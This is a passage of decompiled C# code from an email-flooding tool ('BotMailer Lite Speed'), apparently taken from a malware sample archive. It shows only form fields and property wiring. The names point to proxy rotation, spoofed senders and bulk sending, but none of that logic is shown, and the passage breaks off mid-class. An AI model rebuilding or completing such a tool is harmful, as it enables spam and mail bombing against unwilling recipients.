// Decompiled with JetBrains decompiler
// Type: WindowsApplication17.Form1
// Assembly: Botmailer Lite Speed, Version=1.0.1384.33852, Culture=neutral, PublicKeyToken=null
// MVID: 88833486-5004-4FA6-992A-B27BD1BCD279
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Email-Flooder.Win32.BotMailer-f647edd898ebc2e8aa4b3983ed667932e2084b937bd11403e995db4e208227b9.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace WindowsApplication17
{
  public class Form1 : Form
  {
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("Button2")]
    private Button _Button2;
    [AccessedThroughProperty("MailingList")]
    private Panel _MailingList;
    [AccessedThroughProperty("OpenProxy")]
    private Button _OpenProxy;
    [AccessedThroughProperty("RealEmail")]
    private TextBox _RealEmail;
    [AccessedThroughProperty("SaveAccount")]
    private Button _SaveAccount;
    [AccessedThroughProperty("SaveFileDialog1")]
    private SaveFileDialog _SaveFileDialog1;
    [AccessedThroughProperty("clear")]
    private Button _clear;
    [AccessedThroughProperty("OpenSmtp")]
    private Button _OpenSmtp;
    [AccessedThroughProperty("Button3")]
    private Button _Button3;
    [AccessedThroughProperty("password")]
    private TextBox _password;
    [AccessedThroughProperty("Button4")]
    private Button _Button4;
    [AccessedThroughProperty("Subject")]
    private TextBox _Subject;
    [AccessedThroughProperty("Uselistbox")]
    private MenuItem _Uselistbox;
    [AccessedThroughProperty("HideSMTP")]
    private Button _HideSMTP;
    [AccessedThroughProperty("Send")]
    private MenuItem _Send;
    [AccessedThroughProperty("Proxy")]
    private TextBox _Proxy;
    [AccessedThroughProperty("SmtpAuth")]
    private Panel _SmtpAuth;
    [AccessedThroughProperty("Delete")]
    private Button _Delete;
    [AccessedThroughProperty("smtp")]
    private TextBox _smtp;
    [AccessedThroughProperty("pop3")]
    private TextBox _pop3;
    [AccessedThroughProperty("username")]
    private TextBox _username;
    [AccessedThroughProperty("Accountlist")]
    private ListBox _Accountlist;
    [AccessedThroughProperty("Save")]
    private Button _Save;
    [AccessedThroughProperty("Label6")]
    private Label _Label6;
    [AccessedThroughProperty("Label7")]
    private Label _Label7;
    [AccessedThroughProperty("Label8")]
    private Label _Label8;
    [AccessedThroughProperty("Label9")]
    private Label _Label9;
    [AccessedThroughProperty("Label10")]
    private Label _Label10;
    [AccessedThroughProperty("MenuItem23")]
    private MenuItem _MenuItem23;
    [AccessedThroughProperty("Message")]
    private Panel _Message;
    [AccessedThroughProperty("MenuItem24")]
    private MenuItem _MenuItem24;
    [AccessedThroughProperty("Button6")]
    private Button _Button6;
    [AccessedThroughProperty("Label5")]
    private Label _Label5;
    [AccessedThroughProperty("Label4")]
    private Label _Label4;
    [AccessedThroughProperty("Addaccnt")]
    private Button _Addaccnt;
    [AccessedThroughProperty("MenuItem9")]
    private MenuItem _MenuItem9;
    [AccessedThroughProperty("CheckAll")]
    private Button _CheckAll;
    [AccessedThroughProperty("Label3")]
    private Label _Label3;
    [AccessedThroughProperty("Fromname")]
    private TextBox _Fromname;
    [AccessedThroughProperty("Label2")]
    private Label _Label2;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("Body")]
    private RichTextBox _Body;
    [AccessedThroughProperty("ToName")]
    private TextBox _ToName;
    [AccessedThroughProperty("ReplyTo")]
    private TextBox _ReplyTo;
    [AccessedThroughProperty("From")]
    private TextBox _From;
    [AccessedThroughProperty("Recipient")]
    private TextBox _Recipient;
    [AccessedThroughProperty("MenuItem22")]
    private MenuItem _MenuItem22;
    [AccessedThroughProperty("MenuItem21")]
    private MenuItem _MenuItem21;
    [AccessedThroughProperty("MenuItem18")]
    private MenuItem _MenuItem18;
    [AccessedThroughProperty("HideProxy")]
    private Button _HideProxy;
    [AccessedThroughProperty("Panel2")]
    private Panel _Panel2;
    [AccessedThroughProperty("OpenFileDialog1")]
    private OpenFileDialog _OpenFileDialog1;
    [AccessedThroughProperty("CloseAbout")]
    private Button _CloseAbout;
    [AccessedThroughProperty("Panel1")]
    private Panel _Panel1;
    [AccessedThroughProperty("MenuItem20")]
    private MenuItem _MenuItem20;
    [AccessedThroughProperty("MenuItem19")]
    private MenuItem _MenuItem19;
    [AccessedThroughProperty("MenuItem16")]
    private MenuItem _MenuItem16;
    [AccessedThroughProperty("MenuItem7")]
    private MenuItem _MenuItem7;
    [AccessedThroughProperty("MenuItem6")]
    private MenuItem _MenuItem6;
    [AccessedThroughProperty("MenuItem4")]
    private MenuItem _MenuItem4;
    [AccessedThroughProperty("Stopchecking")]
    private CheckBox _Stopchecking;
    [AccessedThroughProperty("List")]
    private MenuItem _List;
    [AccessedThroughProperty("Button8")]
    private Button _Button8;
    [AccessedThroughProperty("MenuItem1")]
    private MenuItem _MenuItem1;
    [AccessedThroughProperty("Button9")]
    private Button _Button9;
    [AccessedThroughProperty("LinkLabel1")]
    private LinkLabel _LinkLabel1;
    [AccessedThroughProperty("Label21")]
    private Label _Label21;
    [AccessedThroughProperty("MainMenu1")]
    private MainMenu _MainMenu1;
    [AccessedThroughProperty("Button10")]
    private Button _Button10;
    [AccessedThroughProperty("textbox1111")]
    private TextBox _textbox1111;
    [AccessedThroughProperty("TrackBar2")]
    private TrackBar _TrackBar2;
    [AccessedThroughProperty("HTML")]
    private CheckBox _HTML;
    [AccessedThroughProperty("Panel3")]
    private Panel _Panel3;
    [AccessedThroughProperty("Listlog")]
    private ListBox _Listlog;
    [AccessedThroughProperty("Button12")]
    private Button _Button12;
    [AccessedThroughProperty("log")]
    private LinkLabel _log;
    [AccessedThroughProperty("Label13")]
    private Label _Label13;
    [AccessedThroughProperty("Label14")]
    private Label _Label14;
    [AccessedThroughProperty("Button13")]
    private Button _Button13;
    [AccessedThroughProperty("Panel4")]
    private Panel _Panel4;
    [AccessedThroughProperty("Label15")]
    private Label _Label15;
    [AccessedThroughProperty("Button14")]
    private Button _Button14;
    [AccessedThroughProperty("Button15")]
    private Button _Button15;
    [AccessedThroughProperty("Button5")]
    private Button _Button5;
    [AccessedThroughProperty("Label17")]
    private Label _Label17;
    [AccessedThroughProperty("Status")]
    private Label _Status;
    [AccessedThroughProperty("MenuItem11")]
    private MenuItem _MenuItem11;
    [AccessedThroughProperty("ListBox2")]
    private ListBox _ListBox2;
    [AccessedThroughProperty("Button16")]
    private Button _Button16;
    [AccessedThroughProperty("Button17")]
    private Button _Button17;
    [AccessedThroughProperty("Button18")]
    private Button _Button18;
    [AccessedThroughProperty("Button19")]
    private Button _Button19;
    [AccessedThroughProperty("leechbox")]
    private TextBox _leechbox;
    [AccessedThroughProperty("Button21")]
    private Button _Button21;
    [AccessedThroughProperty("Label16")]
    private Label _Label16;
    [AccessedThroughProperty("Button20")]
    private Button _Button20;
    [AccessedThroughProperty("ProxySMTP")]
    private TextBox _ProxySMTP;
    [AccessedThroughProperty("Label12")]
    private Label _Label12;
    [AccessedThroughProperty("Label11")]
    private Label _Label11;
    [AccessedThroughProperty("Threads")]
    private Label _Threads;
    [AccessedThroughProperty("TrackBar1")]
    private TrackBar _TrackBar1;
    [AccessedThroughProperty("Proxylist2")]
    private ListBox _Proxylist2;
    [AccessedThroughProperty("Button7")]
    private Button _Button7;
    [AccessedThroughProperty("Proxylist")]
    private ListBox _Proxylist;
    [AccessedThroughProperty("ListBox1")]
    private ListBox _ListBox1;
    [AccessedThroughProperty("CheckProxy")]
    private Button _CheckProxy;
    [AccessedThroughProperty("Button11")]
    private Button _Button11;
    [AccessedThroughProperty("ProxyGroup")]
    private GroupBox _ProxyGroup;
    private string Sylonious;
    private IContainer components;
    private string[] Domain2;
    private string Domain3;
    private string domainfake;
    private string ip;
    private int i;
    private byte[] data;
    private int position;
    private int id;
    private int length;
    private static int PORT = 53;
    private Encoding ASCII;
    private string Mailserver1;
    private string Mailserver;
    private string Mailserver2;
    private string Error1;
    private string Error2;
    private int P;
    private int MessagesSent;
    private string JJ33;
    public int qou;
    public int ppou;
    private string UsePop;
    private string Useaccount;
    private string Htmlcheck;
    private Socket sock;
    private string RandomProxies;
    private string UseBuiltinSMTP;
    private string Pretendbemx;

    [STAThread]
    public static void Main() => Application.Run((Form) new Form1());

    internal virtual Label Status
    {
      get => this._Status;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Status == null)
          ;
        this._Status = value;
        if (this._Status == null)
          ;
      }
    }

    internal virtual LinkLabel log
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._log != null)
          this._log.LinkClicked -= new LinkLabelLinkClickedEventHandler(this.log_LinkClicked);
        this._log = value;
        if (this._log == null)
          return;
        this._log.LinkClicked += new LinkLabelLinkClickedEventHandler(this.log_LinkClicked);
      }
      get => this._log;
    }

    internal virtual MainMenu MainMenu1
    {
      get => this._MainMenu1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MainMenu1 == null)
          ;
        this._MainMenu1 = value;
        if (this._MainMenu1 == null)
          ;
      }
    }

    internal virtual MenuItem MenuItem1
    {
      get => this._MenuItem1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem1 == null)
          ;
        this._MenuItem1 = value;
        if (this._MenuItem1 == null)
          ;
      }
    }

    internal virtual MenuItem List
    {
      get => this._List;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._List == null)
          ;
        this._List = value;
        if (this._List == null)
          ;
      }
    }

    internal virtual MenuItem MenuItem4
    {
      get => this._MenuItem4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem4 == null)
          ;
        this._MenuItem4 = value;
        if (this._MenuItem4 == null)
          ;
      }
    }

    internal virtual MenuItem MenuItem6
    {
      get => this._MenuItem6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem6 != null)
          this._MenuItem6.Click -= new EventHandler(this.MenuItem6_Click);
        this._MenuItem6 = value;
        if (this._MenuItem6 == null)
          return;
        this._MenuItem6.Click += new EventHandler(this.MenuItem6_Click);
      }
    }

    internal virtual MenuItem MenuItem7
    {
      get => this._MenuItem7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem7 == null)
          ;
        this._MenuItem7 = value;
        if (this._MenuItem7 == null)
          ;
      }
    }

    internal virtual MenuItem MenuItem16
    {
      get => this._MenuItem16;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem16 != null)
          this._MenuItem16.Click -= new EventHandler(this.MenuItem16_Click);
        this._MenuItem16 = value;
        if (this._MenuItem16 == null)
          return;
        this._MenuItem16.Click += new EventHandler(this.MenuItem16_Click);
      }
    }

    internal virtual MenuItem MenuItem19
    {
      get => this._MenuItem19;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem19 == null)
          ;
        this._MenuItem19 = value;
        if (this._MenuItem19 == null)
          ;
      }
    }

    internal virtual MenuItem MenuItem20
    {
      get => this._MenuItem20;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem20 == null)
          ;
        this._MenuItem20 = value;
        if (this._MenuItem20 == null)
          ;
      }
    }

    internal virtual Panel Panel1
    {
      get => this._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Panel1 == null)
          ;
        this._Panel1 = value;
        if (this._Panel1 == null)
          ;
      }
    }

    internal virtual Button CloseAbout
    {
      get => this._CloseAbout;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._CloseAbout != null)
          this._CloseAbout.Click -= new EventHandler(this.CloseAbout_Click);
        this._CloseAbout = value;
        if (this._CloseAbout == null)
          return;
        this._CloseAbout.Click += new EventHandler(this.CloseAbout_Click);
      }
    }

    internal virtual GroupBox ProxyGroup
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ProxyGroup == null)
          ;
        this._ProxyGroup = value;
        if (this._ProxyGroup == null)
          ;
      }
      get => this._ProxyGroup;
    }

    internal virtual OpenFileDialog OpenFileDialog1
    {
      get => this._OpenFileDialog1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._OpenFileDialog1 == null)
          ;
        this._OpenFileDialog1 = value;
        if (this._OpenFileDialog1 == null)
          ;
      }
    }

    internal virtual Panel Panel2
    {
      get => this._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Panel2 == null)
          ;
        this._Panel2 = value;
        if (this._Panel2 == null)
          ;
      }
    }

    internal virtual Button Button11
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button11 != null)
          this._Button11.Click -= new EventHandler(this.Button11_Click);
        this._Button11 = value;
        if (this._Button11 == null)
          return;
        this._Button11.Click += new EventHandler(this.Button11_Click);
      }
      get => this._Button11;
    }

    internal virtual Button HideProxy
    {
      get => this._HideProxy;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._HideProxy != null)
          this._HideProxy.Click -= new EventHandler(this.HideProxy_Click);
        this._HideProxy = value;
        if (this._HideProxy == null)
          return;
        this._HideProxy.Click += new EventHandler(this.HideProxy_Click);
      }
    }

    internal virtual MenuItem MenuItem18
    {
      get => this._MenuItem18;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem18 != null)
          this._MenuItem18.Click -= new EventHandler(this.MenuItem18_Click);
        this._MenuItem18 = value;
        if (this._MenuItem18 == null)
          return;
        this._MenuItem18.Click += new EventHandler(this.MenuItem18_Click);
      }
    }

    internal virtual Button CheckProxy
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._CheckProxy == null)
          ;
        this._CheckProxy = value;
        if (this._CheckProxy == null)
          ;
      }
      get => this._CheckProxy;
    }

    internal virtual MenuItem MenuItem21
    {
      get => this._MenuItem21;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem21 != null)
          this._MenuItem21.Click -= new EventHandler(this.MenuItem21_Click);
        this._MenuItem21 = value;
        if (this._MenuItem21 == null)
          return;
        this._MenuItem21.Click += new EventHandler(this.MenuItem21_Click);
      }
    }

    internal virtual MenuItem MenuItem22
    {
      get => this._MenuItem22;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem22 != null)
          this._MenuItem22.Click -= new EventHandler(this.MenuItem22_Click);
        this._MenuItem22 = value;
        if (this._MenuItem22 == null)
          return;
        this._MenuItem22.Click += new EventHandler(this.MenuItem22_Click);
      }
    }

    internal virtual ListBox Proxylist
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Proxylist != null)
          this._Proxylist.SelectedIndexChanged -= new EventHandler(this.Proxylist_SelectedIndexChanged);
        this._Proxylist = value;
        if (this._Proxylist == null)
          return;
        this._Proxylist.SelectedIndexChanged += new EventHandler(this.Proxylist_SelectedIndexChanged);
      }
      get => this._Proxylist;
    }

    internal virtual TextBox Recipient
    {
      get => this._Recipient;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Recipient == null)
          ;
        this._Recipient = value;
        if (this._Recipient == null)
          ;
      }
    }

    internal virtual Button Button7
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button7 != null)
          this._Button7.Click -= new EventHandler(this.Button7_Click);
        this._Button7 = value;
        if (this._Button7 == null)
          return;
        this._Button7.Click += new EventHandler(this.Button7_Click);
      }
      get => this._Button7;
    }

    internal virtual TextBox From
    {
      get => this._From;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._From == null)
          ;
        this._From = value;
        if (this._From == null)
          ;
      }
    }

    internal virtual TextBox ReplyTo
    {
      get => this._ReplyTo;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ReplyTo == null)
          ;
        this._ReplyTo = value;
        if (this._ReplyTo == null)
          ;
      }
    }

    internal virtual TextBox ToName
    {
      get => this._ToName;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ToName == null)
          ;
        this._ToName = value;
        if (this._ToName == null)
          ;
      }
    }

    internal virtual ListBox Proxylist2
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Proxylist2 != null)
          this._Proxylist2.SelectedIndexChanged -= new EventHandler(this.Proxylist2_SelectedIndexChanged);
        this._Proxylist2 = value;
        if (this._Proxylist2 == null)
          return;
        this._Proxylist2.SelectedIndexChanged += new EventHandler(this.Proxylist2_SelectedIndexChanged);
      }
      get => this._Proxylist2;
    }

    internal virtual RichTextBox Body
    {
      get => this._Body;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Body == null)
          ;
        this._Body = value;
        if (this._Body == null)
          ;
      }
    }

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label1 == null)
          ;
        this._Label1 = value;
        if (this._Label1 == null)
          ;
      }
    }

    internal virtual Label Label2
    {
      get => this._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label2 == null)
          ;
        this._Label2 = value;
        if (this._Label2 == null)
          ;
      }
    }

    internal virtual TrackBar TrackBar1
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._TrackBar1 == null)
          ;
        this._TrackBar1 = value;
        if (this._TrackBar1 == null)
          ;
      }
      get => this._TrackBar1;
    }

    internal virtual TextBox Fromname
    {
      get => this._Fromname;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Fromname == null)
          ;
        this._Fromname = value;
        if (this._Fromname == null)
          ;
      }
    }

    internal virtual Label Label3
    {
      get => this._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label3 == null)
          ;
        this._Label3 = value;
        if (this._Label3 == null)
          ;
      }
    }

    internal virtual Label Threads
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Threads == null)
          ;
        this._Threads = value;
        if (this._Threads == null)
          ;
      }
      get => this._Threads;
    }

    internal virtual Label Label4
    {
      get => this._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label4 == null)
          ;
        this._Label4 = value;
        if (this._Label4 == null)
          ;
      }
    }

    internal virtual Label Label5
    {
      get => this._Label5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label5 == null)
          ;
        this._Label5 = value;
        if (this._Label5 == null)
          ;
      }
    }

    internal virtual Label Label11
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label11 == null)
          ;
        this._Label11 = value;
        if (this._Label11 == null)
          ;
      }
      get => this._Label11;
    }

    internal virtual Label Label10
    {
      get => this._Label10;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label10 == null)
          ;
        this._Label10 = value;
        if (this._Label10 == null)
          ;
      }
    }

    internal virtual Label Label9
    {
      get => this._Label9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label9 == null)
          ;
        this._Label9 = value;
        if (this._Label9 == null)
          ;
      }
    }

    internal virtual Label Label8
    {
      get => this._Label8;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label8 == null)
          ;
        this._Label8 = value;
        if (this._Label8 == null)
          ;
      }
    }

    internal virtual Label Label12
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label12 == null)
          ;
        this._Label12 = value;
        if (this._Label12 == null)
          ;
      }
      get => this._Label12;
    }

    internal virtual Label Label7
    {
      get => this._Label7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label7 == null)
          ;
        this._Label7 = value;
        if (this._Label7 == null)
          ;
      }
    }

    internal virtual Label Label6
    {
      get => this._Label6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label6 == null)
          ;
        this._Label6 = value;
        if (this._Label6 == null)
          ;
      }
    }

    internal virtual ListBox Accountlist
    {
      get => this._Accountlist;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Accountlist != null)
          this._Accountlist.SelectedIndexChanged -= new EventHandler(this.Accountlist_SelectedIndexChanged);
        this._Accountlist = value;
        if (this._Accountlist == null)
          return;
        this._Accountlist.SelectedIndexChanged += new EventHandler(this.Accountlist_SelectedIndexChanged);
      }
    }

    internal virtual TextBox ProxySMTP
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ProxySMTP == null)
          ;
        this._ProxySMTP = value;
        if (this._ProxySMTP == null)
          ;
      }
      get => this._ProxySMTP;
    }

    internal virtual TextBox username
    {
      get => this._username;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._username == null)
          ;
        this._username = value;
        if (this._username == null)
          ;
      }
    }

    internal virtual TextBox pop3
    {
      get => this._pop3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._pop3 != null)
          this._pop3.TextChanged -= new EventHandler(this.pop3_TextChanged);
        this._pop3 = value;
        if (this._pop3 == null)
          return;
        this._pop3.TextChanged += new EventHandler(this.pop3_TextChanged);
      }
    }

    internal virtual TextBox smtp
    {
      get => this._smtp;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._smtp == null)
          ;
        this._smtp = value;
        if (this._smtp == null)
          ;
      }
    }

    internal virtual Button Button20
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button20 != null)
          this._Button20.Click -= new EventHandler(this.Button20_Click);
        this._Button20 = value;
        if (this._Button20 == null)
          return;
        this._Button20.Click += new EventHandler(this.Button20_Click);
      }
      get => this._Button20;
    }

    internal virtual Panel SmtpAuth
    {
      get => this._SmtpAuth;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._SmtpAuth == null)
          ;
        this._SmtpAuth = value;
        if (this._SmtpAuth == null)
          ;
      }
    }

    internal virtual Button HideSMTP
    {
      get => this._HideSMTP;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._HideSMTP != null)
          this._HideSMTP.Click -= new EventHandler(this.HideSMTP_Click);
        this._HideSMTP = value;
        if (this._HideSMTP == null)
          return;
        this._HideSMTP.Click += new EventHandler(this.HideSMTP_Click);
      }
    }

    internal virtual TextBox password
    {
      get => this._password;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._password == null)
          ;
        this._password = value;
        if (this._password == null)
          ;
      }
    }

    internal virtual Button OpenSmtp
    {
      get => this._OpenSmtp;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._OpenSmtp != null)
          this._OpenSmtp.Click -= new EventHandler(this.OpenSmtp_Click);
        this._OpenSmtp = value;
        if (this._OpenSmtp == null)
          return;
        this._OpenSmtp.Click += new EventHandler(this.OpenSmtp_Click);
      }
    }

    internal virtual Label Label16
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label16 == null)
          ;
        this._Label16 = value;
        if (this._Label16 == null)
          ;
      }
      get => this._Label16;
    }

    internal virtual Button clear
    {
      get => this._clear;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._clear != null)
          this._clear.Click -= new EventHandler(this.Button2_Click);
        this._clear = value;
        if (this._clear == null)
          return;
        this._clear.Click += new EventHandler(this.Button2_Click);
      }
    }

    internal virtual SaveFileDialog SaveFileDialog1
    {
      get => this._SaveFileDialog1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._SaveFileDialog1 == null)
          ;
        this._SaveFileDialog1 = value;
        if (this._SaveFileDialog1 == null)
          ;
      }
    }

    internal virtual Button SaveAccount
    {
      get => this._SaveAccount;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._SaveAccount != null)
          this._SaveAccount.Click -= new EventHandler(this.SaveAccount_Click);
        this._SaveAccount = value;
        if (this._SaveAccount == null)
          return;
        this._SaveAccount.Click += new EventHandler(this.SaveAccount_Click);
      }
    }

    internal virtual Button Button21
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button21 != null)
          this._Button21.Click -= new EventHandler(this.Button21_Click);
        this._Button21 = value;
        if (this._Button21 == null)
          return;
        this._Button21.Click += new EventHandler(this.Button21_Click);
      }
      get => this._Button21;
    }

    internal virtual TextBox RealEmail
    {
      get => this._RealEmail;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._RealEmail == null)
          ;
        this._RealEmail = value;
        if (this._RealEmail == null)
          ;
      }
    }

    internal virtual Button OpenProxy
    {
      get => this._OpenProxy;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._OpenProxy != null)
          this._OpenProxy.Click -= new EventHandler(this.OpenProxy_Click);
        this._OpenProxy = value;
        if (this._OpenProxy == null)
          return;
        this._OpenProxy.Click += new EventHandler(this.OpenProxy_Click);
      }
    }

    internal virtual Panel MailingList
    {
      get => this._MailingList;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MailingList == null)
          ;
        this._MailingList = value;
        if (this._MailingList == null)
          ;
      }
    }

    internal virtual TextBox leechbox
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._leechbox == null)
          ;
        this._leechbox = value;
        if (this._leechbox == null)
          ;
      }
      get => this._leechbox;
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button1 != null)
          this._Button1.Click -= new EventHandler(this.Button1_Click_1);
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += new EventHandler(this.Button1_Click_1);
      }
    }

    internal virtual ListBox ListBox1
    {
      get => this._ListBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._ListBox1 == null)
          ;
        this._ListBox1 = value;
        if (this._ListBox1 == null)
          ;
      }
    }

    internal virtual Button Button2
    {
      get => this._Button2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button2 != null)
          this._Button2.Click -= new EventHandler(this.Button2_Click_1);
        this._Button2 = value;
        if (this._Button2 == null)
          return;
        this._Button2.Click += new EventHandler(this.Button2_Click_1);
      }
    }

    internal virtual Button Button3
    {
      get => this._Button3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button3 != null)
          this._Button3.Click -= new EventHandler(this.Button3_Click);
        this._Button3 = value;
        if (this._Button3 == null)
          return;
        this._Button3.Click += new EventHandler(this.Button3_Click);
      }
    }

    internal virtual Button Button19
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button19 == null)
          ;
        this._Button19 = value;
        if (this._Button19 == null)
          ;
      }
      get => this._Button19;
    }

    internal virtual Button Button4
    {
      get => this._Button4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button4 != null)
          this._Button4.Click -= new EventHandler(this.Button4_Click);
        this._Button4 = value;
        if (this._Button4 == null)
          return;
        this._Button4.Click += new EventHandler(this.Button4_Click);
      }
    }

    internal virtual TextBox Subject
    {
      get => this._Subject;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Subject == null)
          ;
        this._Subject = value;
        if (this._Subject == null)
          ;
      }
    }

    internal virtual MenuItem Uselistbox
    {
      get => this._Uselistbox;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Uselistbox != null)
          this._Uselistbox.Click -= new EventHandler(this.Uselistbox_Click);
        this._Uselistbox = value;
        if (this._Uselistbox == null)
          return;
        this._Uselistbox.Click += new EventHandler(this.Uselistbox_Click);
      }
    }

    internal virtual MenuItem Send
    {
      get => this._Send;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Send != null)
          this._Send.Click -= new EventHandler(this.Send_Click);
        this._Send = value;
        if (this._Send == null)
          return;
        this._Send.Click += new EventHandler(this.Send_Click);
      }
    }

    internal virtual Button Button18
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button18 == null)
          ;
        this._Button18 = value;
        if (this._Button18 == null)
          ;
      }
      get => this._Button18;
    }

    internal virtual TextBox Proxy
    {
      get => this._Proxy;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Proxy == null)
          ;
        this._Proxy = value;
        if (this._Proxy == null)
          ;
      }
    }

    internal virtual Button Delete
    {
      get => this._Delete;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Delete != null)
          this._Delete.Click -= new EventHandler(this.Delete_Click);
        this._Delete = value;
        if (this._Delete == null)
          return;
        this._Delete.Click += new EventHandler(this.Delete_Click);
      }
    }

    internal virtual Button Save
    {
      get => this._Save;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Save != null)
          this._Save.Click -= new EventHandler(this.Save_Click);
        this._Save = value;
        if (this._Save == null)
          return;
        this._Save.Click += new EventHandler(this.Save_Click);
      }
    }

    internal virtual Button Button17
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Button17 == null)
          ;
        this._Button17 = value;
        if (this._Button17 == null)
          ;
      }
      get => this._Button17;
    }

    internal virtual MenuItem MenuItem23
    {
      get => this._MenuItem23;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem23 == null)
          ;
        this._MenuItem23 = value;
        if (this._MenuItem23 == null)
          ;
      }
    }

    internal virtual MenuItem MenuItem24
    {
      get => this._MenuItem24;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem24 != null)
